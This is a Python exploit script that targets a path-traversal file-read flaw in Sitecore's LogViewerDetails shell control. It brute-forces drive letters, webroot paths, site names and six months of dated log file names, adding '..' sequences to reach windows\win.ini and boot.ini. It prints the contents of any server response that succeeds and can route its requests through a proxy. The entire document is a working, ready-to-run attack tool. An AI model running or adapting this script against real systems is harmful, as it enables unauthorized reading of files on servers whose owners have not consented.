#!/usr/bin/env python3

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import pandas as pd
from datetime import datetime
import argparse
from urllib.parse import urlsplit

logs = ['\\data\\logs\\log.<date>.txt', '\\data\\logs\\Crawling.log.<date>.txt', '\\data\\logs\\Search.log.<date>.txt', '\\data\\logs\\Publishing.log.<date>.txt']
lfi_paths = ['\\..\\..\\..\\..\\..\\windows\\win.ini', '\\..\\..\\..\\..\\..\\boot.ini']
drives = ['c:', 'd:', 'e:']
potential_website_names = ['site', 'mysite', 'SitecoreWebsite']
webroots = ['\\websites\\<websitename>', '\\inetpub\\wwwroot\\<websitename>', '\\inetpub\\wwwroot']
vuln_path = '/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file='
proxies = None

def date_range(from_date, to_date):
    date_list = pd.date_range(from_date, to_date).tolist()
    return date_list

def send_request(url):
    r = None
    if proxies:
        r = requests.get(url, proxies=proxies, verify=False)
    else:
        r = requests.get(url, verify=False)

    if r.status_code == requests.codes.ok and int(r.headers['Content-Length']) > 0:
        print(f'vulnerable: {url}')
        print(r.text)

def extract_hostname(url):
    return urlsplit(url).netloc

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url')
    parser.add_argument('website_name', nargs='*', help='<Optional> Potential website names')
    parser.add_argument('proxy', nargs='?', help='use a proxy (e.g. 127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url

    global potential_website_names
    potential_website_names.insert(0, extract_hostname(url)) # prepend hostname to potential website names

    if args.website_name:
        website_names = args.website_name
        potential_website_names = website_names + potential_website_names
    if args.proxy:
        global proxies
        proxies = {'http': f'http://{args.proxy}', 'https': f'https://{args.proxy}'}

    to_date = datetime.today()
    from_date = to_date - pd.offsets.DateOffset(months=6)

    for drive in drives:
        for webroot in webroots:
            if '<websitename>' in webroot:
                for potential_website_name in potential_website_names:
                    for lfi_path in lfi_paths:
                        for dt in date_range(from_date, to_date):
                            for log in logs:
                                final_url = url + vuln_path + drive + webroot.replace('<websitename>', potential_website_name) + log.replace('<date>', dt.strftime('%Y%m%d')) + lfi_path
                                send_request(final_url)
            else:
                for lfi_path in lfi_paths:
                    for dt in date_range(from_date, to_date):
                        for log in logs:
                            final_url = url + vuln_path + drive + webroot.replace('<websitename>', potential_website_name) + log.replace('<date>', dt.strftime('%Y%m%d')) + lfi_path
                            send_request(final_url)


if __name__ == '__main__':
    main()
